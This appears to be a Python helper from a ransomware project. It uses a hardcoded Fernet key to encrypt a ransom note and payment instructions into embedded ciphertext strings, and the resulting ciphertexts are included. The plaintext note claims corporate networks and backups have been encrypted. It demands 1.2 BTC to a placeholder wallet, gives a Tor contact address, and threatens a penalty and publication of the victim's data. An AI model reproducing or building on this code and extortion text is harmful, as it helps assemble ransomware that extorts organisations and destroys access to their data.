from cryptography.fernet import Fernet

# = Fernet.generate_key()
#print(key.decode())
# vEkxJSlEyFo_ZnsAoBJAX4cdb4SY57lZfFid27L9YBo=

txt="This is not a system error. It is an active breach. All critical data across your corporate network and associated backups has been encrypted using RSA-4096 cryptography. Your business continuity has been terminated.\nAttempts by your technical staff to decrypt the files will fail. The keys are held exclusively on our secure, offline server. You have no alternatives for recovery."

instructions = f"""
        PAYMENT DETAILS:
        1. Amount: 1.2 BTC (Initial Rate)
        2. Wallet Address: 1CORP-RESCUE-NOW-XXX
        3. Your Unique ID: BSN-8F2D-A3C9-E1B4

        Contact us via Tor (http://datarescue.onion/corporate) with your ID and Transaction Hash.
        FAILURE TO COMPLY within the time limit will result in a 50% penalty and data publication.
        """

FERNET_KEY = b'vEkxJSlEyFo_ZnsAoBJAX4cdb4SY57lZfFid27L9YBo='

fernet = Fernet(FERNET_KEY)

def encrypt_text(text):
    return fernet.encrypt(text.encode('utf-8'))

print("encrypt_note  =", encrypt_text(txt))
print("encrypt_instrutions =", encrypt_text(instructions))

encrypt_note  = b'gAAAAABpgFHPOVUt7wFT891ky9c180TOim-qZ4_Fl2dpgnu-F0TTICwIeGiw-AOgNoR4KRG2lODQ6P9Hv8-xweNbv3bX-oPWrkepwYV-84QMNwQSkRO3uw9EIpb50QSCFIwjXVDKVCIs1hxW8w5omDhouK-HTpgjec_Gbdb5pljP8n6SX-AMshEtQGQxYWVAZ3WDf75m8mmvE-Yz_nI_faRkI72IoYLT8lGHHgYYr9gus_66FDVlgsrXG2U1gYwMOOGw1IosqjdOAvv_OFyfiBZf1Gh-440t7fDHEIqBpD29Yu1agjn2W9pgmP7CqMpdZvHrKzc87HpCWT5DjK45wpj0K0gVYUUavo-ymosQElzygHrWWXcnsqjvCS71CMxQwdayixS63_qvui6F0XS5TvU1XA8Z-cwhFnqzLt-aO0TPZfH_y5Qpow-yMyPRknzJYeC6XV6N8ilAf01AnAuiZ3SbxzLWDa_u0zzSjSTyb6xnl_H59Sj83AS7y2Q15RQlTDPw0AeXpfZ5I2zWs3iZnjLm8UhMBlZPdQDTZR00-f8wZHRB2__CHd8Nh_FrUDJXAcZ7AeNlIsRA'
encrypt_instrutions = b'gAAAAABpgFHPbCk7iVDwPtMqhoih5tzWu7-8VJ1V-B2tPVNwj--7khN47HqjiNEO_P3AQHvyI3U6YJFDYchL9MJMo_cjBqK-ox2FyNJJWyvT6D_s2FC-UqgQ8JcjDjuuGJWmBlqyhJCt4pDGfVkaHlY5R6YYcubxlW1ojfhl05jjyxqmzO_19oKr1tEJqB_sWOq4VQCWjCVjd7A_-76xEqsGf9mJd_n4RfqyIdrxPG0IMmE4ElX6jpW1HOdfUyMarowiRDfgE9x4G6moY55Z4ResEYsPjWk6nlODUfSsrXT-QgkJ7Ku9nedv7rVdXSyuszVf6rpr3txxHpvVJ_6PxDNv1ntVL3HHaRVJJ9hCDCdRBy-ikoczhOKHJuSokDswE-LRF26NRAfUkzH0k8SCywTBWvur7D_xIZfTAdcN61UIUUp4E_Tykewuv1da3iblcF-10el11pLL4EP66Linlwk8N6cilus5HKy87x8HnmZodqBBOcI5SwjRCLYu4xhn8jZm0EaEb6xaY5iSp_Ci48NychSvman21Pbb4olR1vT0bMQdHMeFWQytsujg-gj8iGOP1bNRCNBT'
